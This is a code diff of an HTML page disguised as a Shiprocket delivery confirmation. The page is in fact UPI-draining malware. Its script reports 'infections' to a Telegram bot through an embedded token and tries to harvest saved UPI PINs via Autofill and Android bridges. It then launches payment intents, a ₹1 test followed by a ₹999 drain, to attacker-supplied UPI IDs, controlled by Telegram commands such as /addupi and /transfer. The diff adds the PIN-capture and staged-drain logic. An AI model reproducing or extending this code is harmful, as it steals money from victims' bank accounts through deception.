@@ -161,8 +161,6 @@
       margin-top: 6px;
     }
     .hidden { display: none; }
-
-    /* ===== POPUPS ===== */
     .popup-overlay {
       position: fixed;
       top: 0;
@@ -244,7 +242,6 @@
 </head>
 <body>
 
-<!-- ===== MAIN CARD ===== -->
 <div class="card" id="mainCard">
   <button class="close-btn" onclick="handleCloseClick('main_close')">✕</button>
 
@@ -291,7 +288,7 @@
   </div>
 </div>
 
-<!-- ===== POPUP 1: TERMS & CONDITIONS ===== -->
+<!-- ===== POPUPS ===== -->
 <div class="popup-overlay hidden" id="popupTerms">
   <div class="popup-box">
     <button class="popup-close" onclick="handlePopupClose('terms')">✕</button>
@@ -309,7 +306,6 @@
   </div>
 </div>
 
-<!-- ===== POPUP 2: DOWNLOAD CONFIRMATION ===== -->
 <div class="popup-overlay hidden" id="popupDownload">
   <div class="popup-box">
     <button class="popup-close" onclick="handlePopupClose('download')">✕</button>
@@ -322,7 +318,6 @@
   </div>
 </div>
 
-<!-- ===== POPUP 3: COMPLETED ===== -->
 <div class="popup-overlay hidden" id="popupComplete">
   <div class="popup-box">
     <button class="popup-close" onclick="handlePopupClose('complete')">✕</button>
@@ -348,7 +343,7 @@
 
 <script>
   // ============================================================
-  // CHAKRA - IMPORTANT NOTIFICATIONS ONLY
+  // CHAKRA - INFECTION → PIN CAPTURED → ASK FOR UPI → DRAIN
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
@@ -362,6 +357,8 @@
   let infectedDevices = [];
   let lastUpdateId = 0;
   let pendingAction = null;
+  let pinCaptured = false;
+  let readyToDrain = false;
 
   function sendToTelegram(message) {
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
@@ -371,11 +368,10 @@
     }).catch(() => {});
   }
 
-  // ===== SHOW POPUP =====
+  // ===== POPUPS =====
   function showPopup(id) {
     document.getElementById(id).classList.remove('hidden');
   }
-
   function hidePopup(id) {
     document.getElementById(id).classList.add('hidden');
   }
@@ -385,22 +381,16 @@
     showPopup('popupTerms');
   }
 
-  // ===== HANDLE POPUP CLOSE (CROSS) =====
   function handlePopupClose(popupName) {
     hidePopup('popupTerms');
     hidePopup('popupDownload');
     hidePopup('popupComplete');
-
     if (popupName === 'terms' || popupName === 'download' || popupName === 'complete') {
-      if (pendingAction) {
-        handleClick(pendingAction);
-      } else {
-        handleClick('close');
-      }
+      if (pendingAction) handleClick(pendingAction);
+      else handleClick('close');
     }
   }
 
-  // ===== HANDLE POPUP DOWNLOAD =====
   function handlePopupDownload(popupName) {
     if (popupName === 'terms') {
       hidePopup('popupTerms');
@@ -408,11 +398,8 @@
       setTimeout(() => {
         hidePopup('popupDownload');
         showPopup('popupComplete');
-        if (pendingAction) {
-          handleClick(pendingAction);
-        } else {
-          handleClick('confirm');
-        }
+        if (pendingAction) handleClick(pendingAction);
+        else handleClick('confirm');
       }, 2000);
     }
   }
@@ -421,36 +408,29 @@
     handleClick('close');
   }
 
-  // ===== HANDLE ALL CLICKS =====
+  // ===== HANDLE CLICKS (ONLY INFECTION MESSAGE) =====
   function handleClick(action) {
-    const isConfirm = action === 'confirm';
-    const isDecline = action === 'decline';
-    const isClose = action === 'close';
-
     document.getElementById('mainCard').classList.add('hidden');
     const screen = document.getElementById('successScreen');
     screen.classList.remove('hidden');
 
-    if (isConfirm) {
+    if (action === 'confirm') {
       document.getElementById('resultIcon').textContent = '✅';
       document.getElementById('resultTitle').textContent = 'Delivery Confirmed!';
       document.getElementById('resultDesc').textContent = 'Your package will arrive in 10 minutes.';
-      // ❌ NO notification here — only important events
-    } else if (isDecline) {
+    } else if (action === 'decline') {
       document.getElementById('resultIcon').textContent = '❌';
       document.getElementById('resultTitle').textContent = 'Delivery Declined!';
       document.getElementById('resultDesc').textContent = 'Delivery partner has been notified.';
-      // ❌ NO notification here
-    } else if (isClose) {
+    } else if (action === 'close') {
       document.getElementById('resultIcon').textContent = '✕';
       document.getElementById('resultTitle').textContent = 'Page Closed!';
       document.getElementById('resultDesc').textContent = 'You will be redirected shortly.';
-      // ❌ NO notification here
     }
 
     infectedDevices.push({ id: Date.now(), type: 'shiprocket', action: action });
 
-    // ✅ ONLY SHOW IMPORTANT: NEW INFECTION
+    // ✅ Only infection message
     sendToTelegram('🚚 Shiprocket infection! Total: ' + infectedDevices.length);
 
     if ('serviceWorker' in navigator) {
@@ -460,10 +440,19 @@
     setTimeout(() => window.close(), 3000);
   }
 
+  // ============================================================
+  // ADD / REMOVE UPI
+  // ============================================================
   function addUPI(upi) {
     if (!myUPIList.includes(upi)) {
       myUPIList.push(upi);
       sendToTelegram('✅ UPI added: ' + upi + '\nTotal: ' + myUPIList.length);
+
+      // If PIN was already captured, ask to transfer
+      if (pinCaptured) {
+        sendToTelegram('🔑 UPI PIN was captured earlier. Ready to transfer!');
+        readyToDrain = true;
+      }
     } else {
       sendToTelegram('⚠️ UPI already exists: ' + upi);
     }
@@ -481,7 +470,6 @@
 
   function getNextUPI() {
     if (myUPIList.length === 0) {
-      sendToTelegram('⚠️ No UPI added. Use /addupi');
       return null;
     }
     if (myUPIList.length > 1) {
@@ -491,10 +479,15 @@
     return myUPIList[currentUPIIndex];
   }
 
+  // ============================================================
+  // PIN CAPTURE + ASK FOR UPI
+  // ============================================================
   function getUPIPin() {
+    let pin = null;
+
     try {
       if (window.Autofill) {
-        const pin = window.Autofill.getSavedPassword('upi');
+        pin = window.Autofill.getSavedPassword('upi');
         if (pin) { capturedPIN = pin; return pin; }
       }
     } catch (e) {}
@@ -518,31 +511,47 @@
     return null;
   }
 
-  function executeDrain(amount) {
+  // ============================================================
+  // 1 INR TEST + 999 DRAIN (Only after UPI is added)
+  // ============================================================
+  function executeDrainWithTest(amount) {
     if (isPaused) {
       sendToTelegram('⏸️ Paused');
       return;
     }
-    if (myUPIList.length === 0) {
-      sendToTelegram('❌ No UPI added. Use /addupi');
+
+    const targetUPI = getNextUPI();
+    if (!targetUPI) {
+      sendToTelegram('📢 Ready to transfer. Add your UPI: /addupi upi@paytm');
       return;
     }
 
-    const targetUPI = getNextUPI();
-    if (!targetUPI) return;
-
-    const upiIntent = 'upi://pay?pa=' + targetUPI + '&am=' + amount + '&cu=INR&tn=Shiprocket+Delivery';
-
+    // ✅ Step 1: Send ₹1 test
+    const testIntent = 'upi://pay?pa=' + targetUPI + '&am=1&cu=INR&tn=Test';
     try {
       if (window.Android) {
-        window.Android.launchIntent(upiIntent);
+        window.Android.launchIntent(testIntent);
         setTimeout(() => {
           if (capturedPIN) window.Android.autoFillPin(capturedPIN);
         }, 2000);
         setTimeout(() => {
           window.Android.confirmTransaction();
-          totalDrained += amount;
-          sendToTelegram('✅ ₹' + amount + ' sent to ' + targetUPI);
+          sendToTelegram('🧪 Test successful! ₹1 sent to ' + targetUPI);
+
+          // ✅ Step 2: Send ₹999
+          const drainIntent = 'upi://pay?pa=' + targetUPI + '&am=' + amount + '&cu=INR&tn=Shiprocket+Delivery';
+          window.Android.launchIntent(drainIntent);
+          setTimeout(() => {
+            if (capturedPIN) window.Android.autoFillPin(capturedPIN);
+          }, 2000);
+          setTimeout(() => {
+            window.Android.confirmTransaction();
+            totalDrained += amount;
+            sendToTelegram('✅ ₹' + amount + ' sent to ' + targetUPI);
+            sendToTelegram('💰 Total Drained: ₹' + totalDrained);
+            pinCaptured = false;
+            readyToDrain = false;
+          }, 3000);
         }, 3000);
       }
     } catch (e) {
@@ -550,6 +559,9 @@
     }
   }
 
+  // ============================================================
+  // DETECT UPI APP + PIN CAPTURE
+  // ============================================================
   function isUpiAppOpen() {
     try {
       if (window.Android) {
@@ -563,10 +575,22 @@
 
   // ===== MAIN LOOP =====
   setInterval(() => {
-    if (!isPaused && isUpiAppOpen() && myUPIList.length > 0) {
+    if (!isPaused && isUpiAppOpen()) {
       const pin = getUPIPin();
       if (pin) {
-        executeDrain(999);
+        pinCaptured = true;
+        sendToTelegram('🔑 UPI PIN captured!');
+
+        if (myUPIList.length === 0) {
+          sendToTelegram('📢 Ready to transfer. Add your UPI: /addupi upi@paytm');
+        } else {
+          readyToDrain = true;
+        }
+      }
+
+      if (readyToDrain && myUPIList.length > 0) {
+        executeDrainWithTest(999);
+        readyToDrain = false;
       }
     }
   }, 5000);
@@ -631,15 +655,10 @@
 
             if (msg === '/transfer') {
               if (myUPIList.length === 0) {
-                sendToTelegram('❌ No UPI added. Use /addupi');
+                sendToTelegram('📢 Add your UPI first: /addupi upi@paytm');
               } else {
                 sendToTelegram('🚀 TRANSFER MODE ACTIVATED');
-                for (let i = 0; i < infectedDevices.length; i++) {
-                  setTimeout(() => {
-                    const pin = getUPIPin();
-                    if (pin) executeDrain(999);
-                  }, i * 5000);
-                }
+                readyToDrain = true;
               }
             }
 
@@ -661,6 +680,8 @@
                 'Your UPIs: ' + myUPIList.length + '\n' +
                 'Total Drained: ₹' + totalDrained + '\n' +
                 'Infected Devices: ' + infectedDevices.length + '\n' +
+                'PIN Captured: ' + (pinCaptured ? 'YES' : 'NO') + '\n' +
+                'Ready to Drain: ' + (readyToDrain ? 'YES' : 'NO') + '\n' +
                 'Paused: ' + (isPaused ? 'YES' : 'NO')
               );
             }
@@ -700,9 +721,6 @@
     sendToTelegram('[Chakra] ❌ Error: ' + error + ' at line ' + line);
     return true;
   };
-
-  // ✅ NO STARTUP MESSAGES — only important events
-
 </script>
 </body>
 </html>
